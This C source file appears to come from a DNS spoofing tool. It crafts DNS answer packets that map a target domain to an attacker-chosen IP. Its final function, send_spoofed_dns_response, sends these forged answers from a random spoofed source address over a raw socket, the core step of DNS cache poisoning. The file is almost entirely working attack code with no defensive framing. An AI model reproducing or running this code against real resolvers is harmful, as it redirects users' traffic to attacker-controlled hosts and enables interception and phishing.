#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdint.h>
#include <ctype.h>
#include <time.h>
#include <stdlib.h>

#include "../lib/dns.h"
#include "../lib/udp.h"


#define DNS_SRC_PORT 53


static unsigned int build_answer_section(char *target_ip, uint8_t *dns_answer_section)
{
    struct in_addr target_in_addr;

    struct resource_t *answer;

    inet_aton(target_ip, &target_in_addr);

    answer = (struct resource_t *)(dns_answer_section);

    answer->name = htons(0xc00c);
    answer->type = htons(1);
    answer->class = htons(1);
    answer->ttl = htonl(0x100);//TODO: Think about good ttl.
    answer->rdlength = htons(4);
    memcpy((void *)(&answer->rdata), (void *)&target_in_addr, 4);// TODO is this okay?

    return sizeof(struct resource_t);
}


unsigned int build_dns_response(uint16_t id, char *target_domain,
                                char *target_ip, uint8_t *dns_response)
{
    unsigned int dns_response_bytes;
    unsigned int question_section_bytes;
    unsigned int answer_section_bytes;
    uint8_t *dns_question_section;
    uint8_t *dns_answer_section;

    struct dns_hdr_t *dns_hdr;

    dns_hdr = (struct dns_hdr_t *)dns_response;

    dns_hdr->id = htons(id);
    dns_hdr->qr = 1;
    dns_hdr->opcode =0;
    dns_hdr->aa = 0;
    dns_hdr->tc = 0;
    dns_hdr->rd = 1;
    dns_hdr->ra = 1;
    dns_hdr->z = 0;
    dns_hdr->ad = 0;
    dns_hdr->cd = 0;
    dns_hdr->rcode = 0;
    dns_hdr->qdcount = htons(1);
    dns_hdr->ancount = 0;
    dns_hdr->nscount = 0;
    dns_hdr->arcount = 0;
    dns_hdr->qdcount = htons(1);
    dns_hdr->ancount = htons(1);
    dns_hdr->nscount = 0;
    dns_hdr->arcount = 0;

    dns_question_section = (uint8_t *)(dns_response + sizeof(struct dns_hdr_t));
    question_section_bytes = build_question_section(target_domain, dns_question_section);

    dns_answer_section = (uint8_t *)(dns_response + sizeof(struct dns_hdr_t)
                                              + question_section_bytes);
    answer_section_bytes = build_answer_section(target_ip, dns_answer_section);

    dns_response_bytes = sizeof(struct dns_hdr_t)
                         + question_section_bytes
                         + answer_section_bytes;

    return dns_response_bytes;
}


#define MAX_DNS_RESPONSE_BYTES 1024

void send_dns_response(uint16_t id, char *target_ip,
                       char *target_domain, int sock, struct sockaddr_in dst_addr)
{
    uint8_t dns_response[MAX_DNS_RESPONSE_BYTES];
    unsigned int dns_response_bytes;
    struct sockaddr_in src_addr;

    memset(&src_addr, 0, sizeof(struct sockaddr_in));
    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    src_addr.sin_port = htons(DNS_SRC_PORT);
    if(bind(sock, (struct sockaddr *)&src_addr, sizeof(struct sockaddr_in)) < 0){
        perror("bind");
        exit(1);
    }

    dns_response_bytes = build_dns_response(id, target_domain, target_ip, dns_response);

    if(sendto(sock, dns_response, dns_response_bytes, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) < 0){
        perror("sendto");
        exit(1);
    }
}


void send_spoofed_dns_response(uint16_t id, char *target_ip, char *target_domain,
                               int raw_sock,
                               struct sockaddr_in dst_addr)
{
    uint8_t dns_response[MAX_DNS_RESPONSE_BYTES];
    unsigned int dns_response_bytes;
    struct sockaddr_in src_addr;

    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = (in_addr_t)rand();
    src_addr.sin_port = htons(DNS_SRC_PORT);

    dns_response_bytes = build_dns_response(id, target_domain, target_ip, dns_response);
    send_udp_packet(raw_sock, src_addr, dst_addr, dns_response, dns_response_bytes);
}

